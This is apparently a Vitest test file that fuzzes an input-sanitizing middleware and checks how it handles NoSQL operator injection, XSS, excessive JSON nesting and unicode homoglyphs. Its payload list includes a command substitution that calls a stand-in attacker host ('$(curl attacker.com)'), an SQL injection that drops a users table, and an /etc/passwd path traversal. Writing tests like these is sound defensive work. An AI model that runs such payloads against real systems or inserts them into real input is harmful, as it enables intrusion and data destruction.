import { describe, it, expect } from 'vitest';
import { InputSanitizer } from '../middleware/sanitize.js';

const sanitizer = InputSanitizer.getInstance();

const fuzzPayloads = [
  { $gt: '' },
  { username: { $ne: null } },
  '<script>alert(1)</script>',
  'Robert\'); DROP TABLE users;--',
  '../../etc/passwd',
  'javascript:alert(1)',
  '\u202e evil',
  { nested: { deep: { deeper: { deepest: { value: 'x' } } } } },
  '$(curl attacker.com)',
  { $where: 'function() { return true; }' },
];

describe('input sanitization fuzz payloads', () => {
  it('strips NoSQL operator keys from objects', () => {
    for (const payload of fuzzPayloads) {
      const result = sanitizer.sanitize(payload, { nosqlSanitize: true });
      expect(JSON.stringify(result)).not.toMatch(/\$where|\$gt|\$ne/);
    }
  });

  it('neutralizes common XSS strings', () => {
    const xss = sanitizer.sanitize('<img src=x onerror=alert(1)>', {
      xssProtection: true,
      htmlSanitization: true,
      escapeHtml: true,
    });
    expect(xss).not.toContain('<script');
    expect(xss).not.toContain('onerror=');
  });

  it('rejects excessive JSON nesting depth', () => {
    let deep: Record<string, unknown> = { value: 'leaf' };
    for (let i = 0; i < 20; i++) {
      deep = { nested: deep };
    }

    expect(() =>
      sanitizer.sanitize(deep, { maxJsonDepth: 8, nosqlSanitize: true })
    ).toThrow(/depth limit/i);
  });

  it('normalizes unicode homoglyphs', () => {
    const normalized = sanitizer.sanitize('ＡＤＭＩＮ', {
      normalizeUnicode: true,
      xssProtection: false,
      htmlSanitization: false,
      escapeHtml: false,
      sqlEscape: false,
      commandEscape: false,
    });
    expect(normalized).toBe('ADMIN');
  });
});
